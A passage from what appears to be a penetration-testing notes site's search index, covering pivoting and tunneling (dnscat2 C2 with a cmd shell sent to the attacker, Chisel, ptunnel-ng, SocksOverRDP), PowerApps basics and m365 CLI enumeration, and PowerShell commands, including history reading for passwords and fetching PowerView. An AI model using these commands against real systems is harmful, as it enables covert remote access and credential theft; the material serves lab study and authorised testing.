/p:$password\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#tunneling","title":"Tunneling","text":"","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#dns-tunneling-with-dnscat2","title":"DNS tunneling with Dnscat2","text":"<p>Dnscat2\u00a0is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted\u00a0<code>Command-&amp;-Control</code>\u00a0(<code>C&amp;C</code>\u00a0or\u00a0<code>C2</code>) channel and sends data inside TXT records within the DNS protocol.</p> <p>There is a powershell version for the dnscat2 client: https://github.com/lukebaggett/dnscat2-powershell</p> <p>dnscat2 comes in two parts: the client and the server.</p> <ul> <li>The client is designed to be run on a compromised machine. When you run the client, you typically specify a domain name. All requests will be sent to the local DNS server, which are then redirected to the authoritative DNS server for that domain (which you, presumably, have control of).</li> <li>The server is designed to be run on an\u00a0authoritative DNS server. </li> </ul> <p>dnscat2 strives to be different from other DNS tunneling protocols by being designed for a special purpose: command and control. It can tunnel any data, with no protocol attached. Which means it can upload and download files, it can run a shell, and it can do those things well. It can also potentially tunnel TCP, but that's only going to be added in the context of a pen-testing tool (that is, tunneling TCP into a network), not as a general purpose tunneling tool.</p> <p>1. Install it in the attacker machine kali:</p> <pre><code> git clone https://github.com/iagox86/dnscat2.git\n\n\ncd dnscat2/server/\nsudo gem install bundler\nsudo bundle install\n</code></pre> <p>2. Start the dnscat2 server by executing the dnscat2 file.</p> <pre><code> ./dnscat2 --dns server=x.x.x.x,port=53\n\nsudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache\n</code></pre> <p>After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server:</p> <pre><code>New window created: 0\ndnscat2&gt; New window created: crypto-debug\nWelcome to dnscat2! Some documentation may be out of date.\n\nauto_attach =&gt; false\nhistory_size (for new windows) =&gt; 1000\nSecurity policy changed: All connections must be encrypted\nNew window created: dns1\nStarting Dnscat2 DNS server on 10.10.14.18:53\n[domains = inlanefreight.local]...\n\nAssuming you have an authoritative DNS server, you can run\nthe client anywhere with the following (--secret is optional):\n\n  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local\n\nTo talk directly to the server without a domain name, run:\n\n  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21\n\nOf course, you have to figure out &lt;server&gt; yourself! Clients\nwill connect directly on UDP port 53.\n</code></pre> <p>3. Depending on if we are attacking a windows or a linux machine, we need to use a dnscat2 version for linux or for windows.</p> <ul> <li>Linux: the original dnscat2 </li> <li>Windows: https://github.com/lukebaggett/dnscat2-powershell</li> </ul> <p>In this case our attacked machine 1 is a windows machine so we will install dnscat 2 powershell version for clients.</p> <p>Installation:</p> <pre><code># In the attacker machine, download the repo:\ngit clone https://github.com/lukebaggett/dnscat2-powershell.git\n\n# Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques.\n\n# Once copied, install it in the windows machine\nImport-Module .\\dnscat2.ps1\n</code></pre> <p>4. After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.</p> <pre><code>Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd \n\n# $secret is obtained from the server launched in the kali machne.\n</code></pre> <p>5. In the server launched from the kali machine you will see:</p> <pre><code>New window created: 1\nSession 1 Security: ENCRYPTED AND VERIFIED!\n(the security depends on the strength of your pre-shared secret!)\n\ndnscat2&gt;\n</code></pre> <p>6. Dnscat2 cheat sheet commands:</p> <pre><code># Listing dnscat2 Options\n?\n\n# Interact with sessions and move further in a target environment on engagements\nwindow -i 1\n\n# And you will obtain the shell. But careful, it goes very slow as it is dns \n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#socks5-tunneling-with-chisel","title":"SOCKS5 Tunneling with Chisel","text":"","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#chisel-pivot","title":"Chisel pivot","text":"<p>Chisel\u00a0is a TCP/UDP-based tunneling tool written in\u00a0Go\u00a0that uses HTTP to transport data that is secured using SSH.\u00a0<code>Chisel</code>\u00a0can create a client-server tunnel connection in a firewall restricted environment. </p> <p>This can allow us to pivot from a reachable network segment to a different network segment. For that, we will use the compromised machine (Ubuntu) as our Chisel server, listing on port 1234:</p> NIC Attacker machine: kali Compromised machine Ubuntu Target: A webserver 1 10.10.10.2/24 10.10.10.3/24 2 172.16.5.10/23 Webserver located at the network range 172.16.5.0/23 with a Domain Controller at 172.16.5.19 <p>1. Install chisel: </p> <pre><code>#########\n# In the attacker machine\n#######\ngit clone https://github.com/jpillora/chisel.git\n\ncd chisel\ngo build\n\n\n# It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection.\n# You can run\u00a0`go build -ldflags=\"-s -w\"`\u00a0and reduce it to 7.5MB (where\u00a0`-s`\u00a0is \u201cOmit all symbol information from the output file\u201d or strip, and\u00a0`-w`\u00a0is \u201cOmit the DWARF symbol table\u201d).\ngo build -ldflags=\"-s -w\"\n</code></pre> <p>2. Once the binary is built, we can use SCP to transfer it to the target pivot host.</p> <pre><code>#########\n# In the attacker machine\n#######\nscp chisel ubuntu@10.10.10.3:~/\n\n# And connect to the machine\nssh ubuntu@10.10.10.3\n</code></pre> <p>3. Run the Chisel Server on the Pivot Host, the ubuntu Attacked machine:</p> <pre><code>#########\n# In the Ubuntu compromised machine, our Pivot Host\n#######\n\n./chisel server -v -p 1234 --socks5\n</code></pre> <p>The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.</p> <p>4. Connect to the chisel server</p> <pre><code>#########\n# In the attacker machine\n#######\n./chisel client -v 10.10.10.3:1234 socks\n</code></pre> <p>Results:</p> <pre><code># client: Connecting to ws://10.10.10.3:1234\n# client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening\n# client: tun: Bound proxies\n# client: Handshaking...\n# client: Sending config\n# client: Connected (Latency 120.170822ms)\n# client: tun: SSH connected\n</code></pre> <p>The Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.</p> <p>5. Now we can modify our proxychains.conf file located at /etc/proxychains4.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.</p> <pre><code># Edit the proxychains conf file\nsudo nano /etc/proxychains4.conf\n\n# Add the line `socks5 127.0.0.1 1080`\n</code></pre> <p>6. Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p> <pre><code>proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#chisel-reverse-pivot","title":"Chisel Reverse Pivot","text":"<p>In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.</p> NIC Attacker machine: kali Compromised machine Ubuntu Target: A webserver 1 10.10.10.2/24 10.10.10.3/24 2 172.16.5.10/23 Webserver located at the network range 172.16.5.0/23 with a Domain Controller at 172.16.5.19 <p>1. Start the Chisel Server on our attacker machine or attacker host:</p> <pre><code>#########\n# In the attacker machine\n#######\nsudo ./chisel server --reverse -v -p 1234 --socks5\n</code></pre> <p>2. Then we connect from the Ubuntu (pivot host) to our attacker machine (or attack host), using the option R:socks</p> <pre><code>#########\n# In the Ubuntu compromised machine, our Pivot Host\n#######\n/chisel client -v 10.10.10.2:1234 R:socks\n</code></pre> <p>Results:</p> <pre><code># client: Connecting to ws://10.10.10.2:1234\n# client: Handshaking...\n# client: Sending config\n# client: Connected (Latency 120.170822ms)\n# client: tun: SSH connected\n</code></pre> <p>3. Now we can modify our proxychains.conf file located at /etc/proxychains4.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.</p> <pre><code># Edit the proxychains conf file\nsudo nano /etc/proxychains4.conf\n\n# Add the line `socks5 127.0.0.1 1080`\n</code></pre> <p>4. Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p> <pre><code>proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#icmp-tunneling-with-socks","title":"ICMP tunneling with SOCKS","text":"<p>ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses.</p> <p>Important: ICMP tunneling would only work when ping responses are permitted within a firewalled network. </p> <p>We will use the\u00a0ptunnel-ng\u00a0tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the\u00a0<code>ptunnel-ng client</code>. We can start the\u00a0<code>ptunnel-ng server</code>\u00a0on the target pivot host.</p> <p>1. Install ptunnel-ng in the attacker machine:</p> <pre><code>#########\n# In the attacker machine\n#######\ngit clone https://github.com/utoni/ptunnel-ng.git\n\n# Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory. Building Ptunnel-ng with Autogen.sh\nsudo ./autogen.sh \n\n# Another way to build the ptunnel-ng binary\nsudo apt install automake autoconf -y\ncd ptunnel-ng/\nsed -i '$s/.*/LDFLAGS=-static \"${NEW_WD}\\/configure\" --enable-static $@ \\&amp;\\&amp; make clean \\&amp;\\&amp; make -j${BUILDJOBS:-4} all/' autogen.sh\n./autogen.sh\n\n# After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host\nscp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/\n\n# Connect to the ubuntu\nssh ubuntu@$ipUbuntuCompromisedMachine\n</code></pre> <p>2. Start the ptunnel-ng Server on the Target Host</p> <pre><code>#########\n# In the Ubuntu compromised machine, our Pivot Host\n#######\nsudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22\n</code></pre> <p>3. With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).</p> <pre><code>#########\n# In the attacker machine\n#######\n\n# Connecting to ptunnel-ng Server from Attack Host\nsudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22\n</code></pre> <p>Now we can:</p> <ul> <li>OR Tunnel an SSH connection through an ICMP Tunnel</li> </ul> <pre><code>ssh -p2222 -lubuntu 127.0.0.1\n</code></pre> <ul> <li>OR  use proxychains with nmap to scan targets on the internal network. </li> </ul> <pre><code># First, enable Dynamic Port Forwarding over SSH\nssh -D 9050 -p2222 -lubuntu 127.0.0.1\n\n# Now we can use proxychains with nmap\nproxychains nmap -sV -sT 172.16.5.19 -p3389\n</code></pre> <ul> <li>OR  use proxychains with RDP to connect to the machine in the other network range:</li> </ul> <pre><code># First, enable Dynamic Port Forwarding over SSH\nssh -D 9050 -p2222 -lubuntu 127.0.0.1\n\n# Now we can use proxychains with nmap\nproxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#rdp-and-socks-tunneling-with-socksoverrdp","title":"RDP and SOCKS Tunneling with SocksOverRDP","text":"<p>There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases.\u00a0SocksOverRDP\u00a0is an example of a tool that uses\u00a0<code>Dynamic Virtual Channels</code>\u00a0(<code>DVC</code>) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use\u00a0<code>SocksOverRDP</code>\u00a0to tunnel our custom packets and then proxy through it. We will use the tool\u00a0Proxifier\u00a0as our proxy server.</p> NIC Attacker machine: kali Attacked machine 1: Windows Attacked machine 2: Windows Attacked machine 3: Windows 1 10.10.10.2 10.10.10.3 2 172.16.5.150 172.16.5.19 3 172.16.6.150 172.16.6.155 <p>Our goal will be reaching the attacked machine 3. </p> <p>1. First, we download appropriate binaries to our kali attack host:</p> <ol> <li> <p>SocksOverRDP x64 Binaries</p> </li> <li> <p>Proxifier Portable Binary</p> </li> </ol> <p>2. Attacking machine 1</p> <p>Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.</p> <p>From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. Do it as Admin</p> <pre><code>regsvr32.exe SocksOverRDP-Plugin.dll\n</code></pre> <p>3. Attacking machine 2</p> <p>Now, from the machine 1, we can connect to machine 2  over RDP using\u00a0<code>mstsc.exe</code>. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.</p> <p>4. Attacking machine 3</p> <p>Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.</p> <p>When done, start SocksOverRDP-Server.exe with Admin privileges in machine 2.</p> <p>When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.</p> <pre><code>netstat -antb | findstr 1080\n</code></pre> <p>Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. </p> <pre><code>Open proxifier and go to Profile &gt; Proxy server. Click on \"Add...\"\n</code></pre> <p>With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.</p> <p>So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.</p>","tags":["pentesting"]},{"location":"postfix/","title":"postfix - A SMTP server","text":"","tags":["linux","tool","SMTP","SMTP server"]},{"location":"postfix/#local-installation","title":"Local installation","text":"<pre><code>sudo apt update\n\nsudo apt install mailutils\n# At the end of the installation a pop up will prompt you about the general type of mail configuration. Pick \"Internet site\". If not prompted, run this to execute it:\nsudo dpkg-reconfigure postfix\n# System mail name must coincide with the  server's name you provided before.\n</code></pre> <p>To edit the configuration of the service:</p> <pre><code>sudo nano /etc/postfix/main.cf\n</code></pre> <p>More on https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-postfix-as-a-send-only-smtp-server-on-ubuntu-18-04-es.</p>","tags":["linux","tool","SMTP","SMTP server"]},{"location":"powerapps-pentesting/","title":"Pentesting PowerApps","text":"<p>Sources from these notes</p> <p>Power Apps - Complete Guide to Microsoft PowerApps</p> <p>Powerapp falls into the category of a No-code/Low-code solution. PowerApps is the Microsoft solution for developing applications (app is built in a powerapp environment that takes care of everything needed for your code to be run everywhere).</p> <p>PowerApp enables your application to connect to anything and have a great deal of customizing features.</p> <p>Power Apps developed in the Power Platform environment and published for use by internal and external users are often critical to the organization. </p> <p>They enable key business processes, leverage and interface with highly sensitive business data and integrate with multiple data source and applications, consequently becoming the gateway from the cloud to the most sensitive business applications of the organization.</p>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#basics-on-powerapps","title":"Basics on PowerApps","text":"<p>Power Apps is a collection of services, apps, and connectors that work together to let you do much more than just view your data. You can act on your data and update it anywhere and from any device.</p> <p>Power Apps Home Page: If you are building an app, you'll start with the Power Apps Home Page. You can build apps from sample apps, templates, or a blank screen. </p> <p>Power Apps Studio: Power Apps Studio is where you can fully develop your apps to make them more effective as a business tool and to make them more attractive:</p> <ul> <li>Left pane - Shows a hierarchical view of all the controls on each screen or a thumbnail for each screen in your app.</li> <li>Middle pane - Shows the canvas app that you're working on.</li> <li>Right pane - Where you set options such as the layout, properties, and data sources for certain controls.</li> </ul> <p>Microsoft Power Platform admin center: Microsoft Power Platform admin center is the centralized place for managing Power Apps for an organization. On this site, you can define and manage different environments to house the apps. For example, you might have separate environments for development and production apps. Additionally, you can define data connections and manage environment roles and data policies.</p>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#simple-data-application","title":"Simple data application","text":"<p>You just need to connect a spreadsheet with a table. What you connect is the table. PowerApps synchronizes your application by adding an id column to the table in your spreadsheet. </p> <p>Your new app will have three components:</p> <ul> <li>Listing page screen.</li> <li>Details screen</li> <li>CRUE operations on records: Edit record, Add new record, Delete record.</li> </ul> <p>Each item/record corresponds with a row from your connected spreadsheet. Galleru is a representation of a list of records that's pulling from a connected table. </p> <p>Saving the application: by default Microsoft will safe your app, but for that to happen you first need it to save it for the first time.</p> <p>Tree view displays all the screen of your application. Under the screen level you have the elements that compose your screen. Elements can have sub elements.   </p> <p>Properties</p> <p>Elements have properties. Properties can be set statically or dynamically. Dynamically set properties open the door for users updating values or things like resizing elements based on height, for instance. </p> <pre><code># This references to the connected spreadsheet column name\nThisItem.HeadingColumnName \n\n#  This will reference to the value inserted in that element.\nNameofElement.Default \n</code></pre> <p>Additionally, you have formatting functions, like for instance the Text function, that can be applied to a property (dynamically or statically established).</p> <pre><code># Format element to mm/dd/yyyy \nText(ThisItem.HeadingColumnName, \"mm/dd/yyyy\" )\n\n# Concatenate elements \nConcatenate (ThisItem.HeadingColumnName, ThisItem.HeadingColumnName2)\n# For instance:  Concatenate (ThisItem.FirsName, ThisItem.LastName)\n\nConcatenate (NameofElement.Default,  NameofElement2.Default)  \n# For instance: Concatenate (First_Name_Card.Default, Last_Name_Card.Default)  \n</code></pre> <p>A data card has a property called UPDATE. This is useful in forms or user input, in which what you finally submit to the database is not their input but the result of that input after the UPDATE transformation has taken place. </p> <p>Basically what happens is when you click the check mark, what it's basically doing is it's using the update property of each of the data cards here, and actually submitting it to the underlying data itself.</p> <p>More properties: </p> <ul> <li>DisplayMode. This can be set to View, Edit... You can granularly set the property of an element to View (so no edition is possible). Or you can set that property for their parent.</li> </ul> <p>Triggers</p> <p>Elements have properties and triggers. Triggers is an action that an user perform on an element. They are quite similar to those actions called in javascript (onload, onselect,...).</p> <p>Configuring a triggers: you basically select an element (button), set the action you want (onclick) and the function you want to assign it (submit). You can separate actions with \";\". </p> <p>Triggers help you build the functionality of your application. For instance, in this basic app, navigation from one screen to another is actioned with a Navigate trigger. Or, for instance, starting the application is a trigger itself.</p> <p>Formulas and functions</p> <p>Formula Reference for PowerApps</p> <p>Canvas application</p> <p>Building an application from scratch.</p> <p>A common practice, to have a master screen and a document screen: First thing you do is creating a master screen that will be used as a template for the rest of your screens in your application.  The second thing you will do is creating a screen named Documentation. Master screen will be to create elements in your app. Documentation will be for assigning style to those elements. Master screen elements will reference Document screen.</p> <p>Variables in Powerapps are different from variables in programmed languages. There 3 types:</p> <ul> <li>Contextual variables: Variables is only active when you are on the screen.</li> <li>Global variables: they are accessible from all screens in the application.</li> <li>Collection variables.</li> </ul> <p>How to set up a contextual variable. Select an element in the screen. Select \"OnSelect\" and add the function:</p> <pre><code>UpdateContext({FirstNumber: TextInput.Text})\n# When you select an element, for instance an input field, it will create a variable called FirstNumber and it will assign it the value of the input field that you have selected\n</code></pre> <p>How to set up a global variable. By using the SET function</p> <pre><code>Set(CounterGlobal, CounterGlobal+1)\n</code></pre> <p>Collections variable are useful for datatables and galleries.</p> <p>Example. Create a button and OnSelect that button add this function:</p> <pre><code>Collect(OurCollection, {First: \"Ben\", Second: \"Dover\"})\n# that it's creating a collection called our collection. It's creating two columns in that. The first column is called first. The second column is called second. And the first record in the first column is Ben, and the first record in the second column is called Dover.\n</code></pre> <p>Create a Gallery, and as Data source, add your collection. This way everytime you click on that button you will be adding \"Ben\" and \"Dover\" as a card to that gallery. Of course you can substitute those two static texts to references to inputs fields:</p> <pre><code>Collect(OurCollection, {First: \"TextInput4.Text\", Second: \"TextInput5.Text\"})\n</code></pre> <p>To remove an item from a collection, add a icon-button for removing and onSelect:</p> <pre><code>Remove(OurCollection, ThisItem)\n</code></pre> <p>Filtering cards displayed in a gallery. Select the Gallery, onSelect:</p> <pre><code>Search(NameOfTable, &lt;ElementToSearch&gt;, &lt;WhichColumnsSearchinTable&gt;)\n\n# For example, to display all cards in connected table \"Table1\":\nSearch(Table1, \"\", \"FirstName\")\n\n# To make it dependable on user's input, create an input field and\nSearch(Table1, TexInput1.Text, \"FirstName\", \"LastName\", \"Location\")\n</code></pre> <p>Only show the search input if someone click on the search icon. </p> <ul> <li>Set the Input search box default visibility to False.</li> <li> <p>Insert a magnifier icon. OnSelect:</p> <pre><code>UpdateContext({SearchVisible: True})\n</code></pre> </li> <li> <p>Modify the search input field. When Visible: </p> <pre><code>SearchVisible\n</code></pre> </li> </ul> <p>To trigger SearchVisible to false (and hide search input field), we will modify the magnifier icon, onSelect:</p> <pre><code>```\nUpdateContext({SearchVisible: !SearchVisible})\n```\n</code></pre> <p>More interesting formulas is Filter</p> <pre><code># An example of a multi-layered built function, with Filter and Search functionality. Create a dropdown menu &gt; Items\nFilter(Search(Table1, TexInput1.Text, \"FirstName\", \"LastName\", \"Location\"), VIPLevel = Dropdown.Selected.Value)\n</code></pre> <p>And also SubmitForm, which aggregates all the updates in a form control and submits the form.</p> <pre><code>SubmitForm(FormName)\n</code></pre>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#well-known-vulnerabilities-under-build","title":"Well-known vulnerabilities (under build)","text":"","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#data-exposure","title":"Data exposure","text":"<p>https://rencore.com/en/blog/how-to-prevent-the-next-microsoft-power-apps-data-leak-from-happening</p> <p>From https://dev.to/wyattdave/ive-just-been-hacked-by-a-power-app-1fj4</p>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#not-using-service-accounts","title":"Not using Service accounts","text":"<p>The security issue is all around how the Power Platform handles credentials, with each user/owner signing in and storing their credentials in connections. Meaning that if you share a flow created with your user, your are sharing your connections (aka credentials).</p> <p>One way to prevent this issue is by using service accounts.</p>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#sharing-flows","title":"Sharing flows","text":"<p>If you need to share a flow:</p> <ul> <li>Use send a copy or </li> <li>share a flow  as a run only user (as that requires their credentials).</li> </ul>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#configuring-connections-to-the-least-privilege","title":"Configuring connections to the least privilege","text":"<p>When configuring a flow, don't include additional unnecessary connections in any flow. As per Powerapps  works, this situation may happen:</p> <p>A connection  set to the highest privilege (you share read calendar and you give write access to emails).</p> <p>A wa This has its strengths, as all credentials are securely stored and accessing apps/ running flows is easy as the Power Platform handles everything. The problem comes when you share flows, as what you might not realise is you are sharing your connections (aka credentials) with that user. They may not be able to see your credentials, but that doesn't mean they cant use them in a way that you didn't want. And what's worse is there is no granularity in connections, so an Outlook connection used for reading events can be used to delete emails.</p>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#protecting-powerapps-with-microsoft-sentinel","title":"Protecting PowerApps with Microsoft Sentinel","text":"<p>As Power Platform is part of the Microsoft offering, Microsoft Sentinel adresses many security issues:</p> <ul> <li>Collect\u00a0Microsoft Power Platform and Power Apps activity logs, audits, and events into the Microsoft Sentinel workspace.</li> <li>Detect\u00a0execution of suspicious, malicious, or illegitimate activities within Microsoft Power Platform and Power Apps.</li> <li>Investigate\u00a0threats detected in Microsoft Power Platform and Power Apps and contextualize them with additional user activities across the organization.</li> <li>Respond\u00a0to Microsoft Power Platform-related and Power Apps-related threats and incidents in a simple and canned manner manually, automatically, or via a predefined workflow.</li> </ul> <p>Data connectors for Microsoft Sentinels</p> Connector Name Covered Logs / Inventory Power Platform Inventory (using Azure Functions) Power Apps and Power Automate inventory data Microsoft Power Apps (Preview) Power Apps activity logs Microsoft Power Automate (Preview) Power Automate activity logs Microsoft Power Platform Connectors (Preview) Power Platform connector activity logs Microsoft Power Platform DLP (Preview) Data loss prevention activity logs Dynamics365 Dataverse and model-driven apps activity logging <p>Sentinel rules for protecting PowerApps platform:</p> Rule name What does it detect? PowerApps - App activity from unauthorized geo Identifies Power Apps activity from countries in a predefined list of unauthorized countries. PowerApps - Multiple apps deleted Identifies mass delete activity where multiple Power Apps are deleted within a period of 1 hour, matching a predefined threshold of total apps deleted or app deletes events across multiple Power Platform environments. PowerApps - Data destruction following publishing of a new app Identifies a chain of events where a new app is created or published, that is followed by mass update or delete events in Dataverse within 1 hour. The incident severity is raised if the app publisher is on the list of users in the TerminatedEmployees watchlist template. PowerApps - Multiple users accessing a malicious link after launching new app Identifies a chain of events, where a new Power App is created, followed by multiple users launching the app within the detection window and clicking on the same malicious URL. PowerAutomate - Departing employee flow activity Identifies instances where an employee who has been notified or is already terminated creates or modifies a Power Automate flow. PowerPlatform - Connector added to a Sensitive Environment Identifies occurrences of new API connector creations within Power Platform, specifically targeting a predefined list of sensitive environments. PowerPlatform - DLP policy updated or removed Identifies changes to DLP policy, specifically policies which are updated or removed.","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#attacks","title":"Attacks","text":"<p>Install m365 CLI.</p>","tags":["database","cheat","sheet"]},{"location":"powerapps-pentesting/#ennumeration-techniques","title":"Ennumeration techniques","text":"<p>Get information about the default Power Apps environment.  </p> <pre><code>m365 pa environment get  \n</code></pre> <p>List Microsoft Power Apps environments in the current tenant </p> <pre><code>m365 pa environment list \n</code></pre> <p>List all available apps for that user  </p> <pre><code>m365 pa app list  \n</code></pre> <p>List all apps in an environment as Admin  </p> <pre><code>m365 pa app list --environmentName 00000000-0000-0000-0000-000000000000 --asAdmin  \n</code></pre> <p>Remove an app  </p> <pre><code>m365 pa app remove --name 00000000-0000-0000-0000-000000000000  \n</code></pre> <p>Removes the specified Power App without confirmation  </p> <pre><code>m365 pa app remove --name 00000000-0000-0000-0000-000000000000 --force  \n</code></pre> <p>Removes the specified Power App you don't own  </p> <pre><code>m365 pa app remove --name 00000000-0000-0000-0000-000000000000 --environmentName Default- 00000000-0000-0000-0000-000000000000 --asAdmin  \n</code></pre> <p>Add an owner without removing the old one  </p> <pre><code>m365 pa app owner set --environmentName 00000000-0000-0000-0000-000000000000 --appName 00000000-0000-0000-0000-000000000000 --userId 00000000-0000-0000-0000-000000000000 --roleForOldAppOwner CanEdit  \n</code></pre> <p>Export an app</p> <pre><code>m365 pa app export --environmentName 00000000-0000-0000-0000-000000000000 --name 00000000-0000-0000-0000-000000000000 --packageDisplayName \"PowerApp\" --packageDescription \"Power App Description\" --packageSourceEnvironment \"Pentesting\" --path ~/Documents\n</code></pre>","tags":["database","cheat","sheet"]},{"location":"powercat/","title":"Powercat - An alternative to netcat coded in PowerShell","text":"<p>Netcat comes pre-installed in most Linux distributions. There is also a version for windows:  download from https://nmap.org/download.html. </p> <p>As for  Windows machines,  there's an alternative to netcat coded in PowerShell called PowerCat. </p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"powershell/","title":"Powershell","text":""},{"location":"powershell/#basic-commands","title":"Basic commands","text":"<pre><code># List users of Administrator group\nnet localgroup Administrators\n\n# List contents\ndir\nGet-ChildItem -Force\n# -Force: Display hidden files \ngci\n# Short variant of dir\n\n# Count files from a directory\n(Get-ChildItem -File -Recurse | Measure-Object).Count\n\n# Find specific items from the directory specified by the Path parameter that contains the string cred.\nGet-ChildItem -Recurse -Path N:\\ -Include *cred* -File\n\n# Print working directory\npwd\nGet-Location\n\n# Change directory\ncd\ncd ..           // it gets you up one level\ncd ..\\brotherdirectory  // go to a brother directory\ncd ~\\Desktop        // go to logged user's Desktop\n\n# Creates folder\nmkdir nameOfFolder\nNew-Item -ItemType Directory nameOfDirectory\n\n# Display all commands saved in a file\nhistory\nGet-history\n\n# With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.\nGet-Content $env:APPDATA\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt    \n\n# Browse the command history\nCTRL-R\n\n# Select-String: The\u00a0`Select-String`\u00a0cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use\u00a0`Select-String`\u00a0similar to\u00a0`grep`\u00a0in UNIX or\u00a0`findstr.exe`\u00a0in Windows.\nGet-ChildItem -Recurse -Path N:\\ | Select-String \"cred\" -List\n\n\n\n# Clear screen\nclear\nClear-Host\n\n# Copy item\ncp nameOfSource nameOfDestiny\nCopy-Item nameOfSource nameOfDestiny\n\n# Copy a folder and its content\ncp originFolder destinyPath -Recurse\nCopy-Item originFolder destinyPath -Recurse\n\n# Way 1: Get running processes filtered by name\nget-process -name ccSvcHst\n\n# Way 2: Get running processes filtered by the string\ntasklist /V |findstr backupadm\n\n# Kill processes called ccSvcHst* // Notice here wild card *\ntaskkill /f /im ccSvcHst*\n\n# Remove a file\nrm nameofFile -Recurse\n# -Recurse: Remove it recursively (in a folder)\n\n# Display content of a file\ncat nameofFile\nGet-Content nameofFile\n\n# Display one page of a file at a time\nmore nameofFile\n\n# Display the first lines of a file\nhead nameofFile\n\n# Open a file with an app\nstart nameofApp nameofFile\n\n# Runs commands or expressions on the local computer.\n$Command = \"Get-Process\"\nInvoke-Expression $Command\n# PS uses Invoke-Expression to evaluate the string. Otherwise the output of $Command would be the text \"Get-Process\". Invoke-Expression is similar to $($command) in linux.\n# IEX is an alias\n\n\n# Gets content from a web page on the internet.\nInvoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile 